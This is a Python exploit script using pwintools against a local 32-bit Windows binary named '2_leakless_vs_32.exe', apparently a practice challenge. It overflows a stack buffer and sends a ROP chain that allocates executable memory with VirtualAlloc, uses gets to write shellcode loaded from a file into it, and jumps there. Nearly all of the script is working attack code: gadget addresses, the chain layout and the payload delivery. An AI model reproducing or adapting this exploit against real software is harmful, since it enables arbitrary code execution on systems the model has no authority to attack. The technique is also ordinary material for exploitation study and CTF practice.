# I also made this because it's simpler than the previous one

from pwintools import *

retAddrOffs = 40

# gadgets
VIRTUAL_ALLOC_WRAPPER = 0x402258 # jmp [__imp__VirtualAlloc@16]
GETS_ADDR = 0x41E4B0

SAVE_EAX = 0x0042c9df # mov dword ptr [0x44e78c], eax; ret;
RESTORE_EAX = 0x0041f183 # mov eax, dword ptr [0x44e78c]; ret;

MOV_ECX_ESP = 0x00401112 # mov ecx, esp; ret;
MOV_P_ECX_16_EAX = 0x0042b39e # mov dword ptr [ecx + 0x10], eax; ret;
NOP = 0x0040103d # ret;

JMP_EAX = 0x00401c4f # jmp eax;

ADD_ESP_4 = 0x0041fb9e # add esp, 4; ret;


# main

p = Process('2_leakless_vs_32.exe')

#p.set_timeout(3600000) # to have time to interact with the debugger
# input('press enter after attaching the debugger...')

f = open('TMP', 'rb')
shellcode = f.read()
f.close()

p.recvuntil(b'password:\r\n')

# strategy: allocate rwx memory; call gets to write into it; jump there
ropchain = (
	p32(VIRTUAL_ALLOC_WRAPPER) +
	p32(SAVE_EAX) + # stdcall + rop = gg ez: the next 4 dwords will be popped by ret
	p32(0) + # where
	p32(1337) + # size
	p32(MEM_RESERVE | MEM_COMMIT) +
	p32(0 + PAGE_EXECUTE_READWRITE) +
	
	p32(MOV_ECX_ESP) +
	p32(MOV_P_ECX_16_EAX) +
	p32(NOP) +

	p32(GETS_ADDR) +
	p32(ADD_ESP_4) + # cdecl needs skipping params
	p32(1337) + # here will go allocated mem

	p32(RESTORE_EAX) +
	p32(JMP_EAX)
)
p.sendline(b'a'*retAddrOffs + ropchain) # this part wll be read by the program
p.sendline(shellcode) # this part will be read by the ropchain's gets

print(p.recvall())
